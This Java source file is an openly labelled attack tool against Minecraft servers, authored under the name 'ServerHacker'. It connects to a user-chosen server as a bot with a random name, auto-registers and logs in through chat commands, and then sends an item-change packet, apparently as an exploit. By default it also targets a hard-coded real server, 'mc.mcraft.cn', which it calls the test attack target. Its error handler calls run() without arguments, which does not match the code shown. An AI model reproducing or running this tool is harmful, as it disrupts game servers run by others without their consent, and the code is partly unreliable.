package minecraftprotocol;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Random;
import java.util.Scanner;
import java.util.Timer;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author ServerHacker
 */
public class MinecraftProtocol {

    //
    public static void main(String[] args) throws IOException, InterruptedException {
        Scanner sc = new Scanner(System.in);
        System.out.println("请输入服务器IP:");
        String host = sc.next();
        System.out.println("请输入服务器端口(默认为25565):");
        int port = Integer.parseInt(sc.next());
        run(host, port);
        //example 
        System.out.println("开启测试攻击对象? 1表示取消 回车表示使用测试对象");
        if (!sc.next().equals("1")) {
            run("mc.mcraft.cn", 25565);
        }
    }

    static String nameKey[] = new String[]{"Alex", "Wood", "dy", "sure", "er", "mon", "Li", "Ly", "Kity", "Zhang", "Cheng", "Wang", "Li", "Jia", "Long", "Mei", "Shang", "Yao", "Hong", "Sheng", "Qi"};
    static Random rand = new Random();

    public static String buildName() {
        return nameKey[rand.nextInt(nameKey.length)] + "_" + rand.nextInt(1000);
    }

    public static void run(final String host, final int port) throws IOException, InterruptedException {
        new Thread() {
            public void run() {
                try {
                    System.out.println("正在连接服务器" + host + ":" + port);
                    final PlayerHandler socket = new PlayerHandler(host, port);
                    System.out.println("连接成功!正在登陆中!");
                    socket.handshake();
                    String name = buildName();
                    socket.login(name);
                    System.out.println("以名字" + name + "登陆!");
                    Thread.sleep(1000);

                    String pw = buildName();
                    socket.chat("/reg " + pw + " " + pw);
                    socket.chat("/l " + pw);
                    System.out.println("登陆成功!所使用的密码为:" + pw);
                    new Thread() {
                        public void run() {
                            try {
                                System.out.println("保持InputStrea开启");
                                int a;
                                while ((a = socket.getInputStream().read()) != -1) {
                                }
                            } catch (IOException ex) {
                                Logger.getLogger(MinecraftProtocol.class.getName()).log(Level.SEVERE, null, ex);
                            }
                        }
                    }.start();

                    Thread.sleep(1000);

                    Random rand = new Random();
                    if (true) {

                        socket.writeItemChange();

                    }
                } catch (Exception e) {
                    System.out.println("遇到了一个错误,这可能是某一环节出错");
                    System.out.println(e.getCause());
                    System.out.println("Stack Trace");
                    e.printStackTrace(System.out);
                    run();
                }
            }
        }.start();
    }

}
